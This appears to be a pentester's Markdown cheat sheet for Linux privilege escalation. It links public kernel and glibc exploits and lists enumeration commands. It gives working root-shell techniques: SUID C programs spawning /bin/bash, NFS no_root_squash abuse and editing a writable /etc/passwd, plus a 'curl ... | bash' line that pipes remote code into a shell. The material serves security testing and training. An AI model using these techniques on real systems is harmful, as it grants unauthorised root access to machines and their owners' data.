# Privilege Escalation

## Guides

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

## Related

[GTFOBins](https://gtfobins.github.io/#)

## Public exploits

### Dirty COW

[Dirty COW (CVE-2016-5195)](https://dirtycow.ninja) is a privilege escalation vulnerability in the Linux Kernel

### Rational Love

glibc - 'getcwd()' Local Privilege Escalation 2018 local root exploit  
[local-root-exploits/linux/CVE-2018-1000001 at master · 5H311-1NJ3C706/local-root-exploits · GitHub](https://github.com/5H311-1NJ3C706/local-root-exploits/tree/master/linux/CVE-2018-1000001)

## Manual

### Kernel exploits

Get linux/kernel version (e.g. `Linux kali 5.14.0-kali2-arm64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) aarch64 GNU/Linux`)
```bash
uname -a
```

Get "marketing" name of distribution (e.g. `Ubuntu 20.04.1 LTS`)
```bash
cat /etc/issue 
```

Get stuff like gcc (e.g. `Linux version 5.14.0-kali2-arm64 (devel@kali.org) (gcc-10 (Debian 10.3.0-11) 10.3.0, GNU ld (GNU Binutils for Debian) 2.37) #1 SMP Debian 5.14.9-2kali1 (2021-10-04)`)
```bash
cat /proc/version
```

Then use `searchsploit` ([https://www.exploit-db.com](exploit-db.com)), Google, GitHub, etc. to check for public available kernel exploits.

### Sudo

Check current privilege status
```bash
sudo -l
```

Todo: `LD_PRELOAD`  
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

### SUID

Find files that have SUID or SGID bit set
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

### Capabilities

List enabled capabilities
```bash
getcap -r / 2>/dev/null
```

### Cron Jobs

```
cat /etc/crontab
```

### NFS

Check for `no_root_squash` option in
```bash
cat /etc/exports
```

Mount share
```bash
mkdir /tmp/share
mount -o rw <ip>:/share /tmp/share
cd /tmp/share
```

Create SUID binary
```c
int main()
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

Compile it, set SUID bit
```bash
gcc binary.c binary -w
chmod +s binary
```

Run it on target
```
./binary
```

## Automated

### LinPEAS

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) - Linux Privilege Escalation Awesome Script

### LinEnum.sh

> Scripted Local Linux Enumeration & Privilege Escalation Checks  
[GitHub - rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

```
-t		Include thorough (lengthy) tests
```

Execute on target:
```bash
curl <local-ip>:<port>/LinEnum.sh | bash
```

### Linux Smart Enumeration (LSE)

> Linux enumeration tool for pentesting and CTFs with verbosity levels  
[GitHub - diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

### Linux Exploit Suggester (LES)

Linux privilege escalation auditing tool  
[GitHub - mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

### linuxprivchecker.py

A Linux Privilege Escalation Check Script  
[GitHub - sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

### Unix-privesc-check

[unix-privesc-check | Penetration Testing Tools](https://tools.kali.org/vulnerability-analysis/unix-privesc-check)

## Manual information gathering

### Operating system

```bash
cat /etc/*-release
uname -i
uname -a
```

### Users

```bash
id
pwd 
```

```bash
cat /etc/passwd
```
-> Check for anything above id 1000

```bash
grep -vE "nologin|false" /etc/passwd
```

### Groups

Interesting unix groups  
`44(video)` <- has access to video output (weird stuff)  
`6(disk)` <- has raw access to the file system, read disk using e.g. `debugfs`

### Processing running

```bash
ps aux
```
-> Is there something special, maybe related to the users found?

### Network

```bash
netstat -antup
```
-> Is any service running, we missed in the port scan (firewall?)

### Packages

```bash
dpkg -l
```

Check for manually installed stuff
```bash
/var/
/opt/
/usr/local/src
/usr/src
/home/<username>
```

## Weak services

Look for files that have root privileges but are writeable for everyone -> replace file with exploit

## Check tools potentially vulnerable to priv esc?

```bash
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```

## setuid

Check if available  
`mount` -> must **not** `nosuid`

setuid.c
```c
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Alternative setuid.c
```c
int main(int argc, char *argv[]) {
    setreuid(0, 0);
    execve("/bin/sh", NULL, NULL);
}
```

```bash
gcc setuid.c -o setuid
chown root:root /tmp/setuid; chmod 4755 /tmp/setuid
```

## Writable /etc/passwd
Change root, remove the "x" (password flag):  
`root:x:0:0:root:/root:/bin/bash` -> `root::0:0:root:/root:/bin/bash`  
`su`  
-> root

[linux - Privilege escalation using passwd file - Information Security Stack Exchange](https://security.stackexchange.com/a/170335/189482)
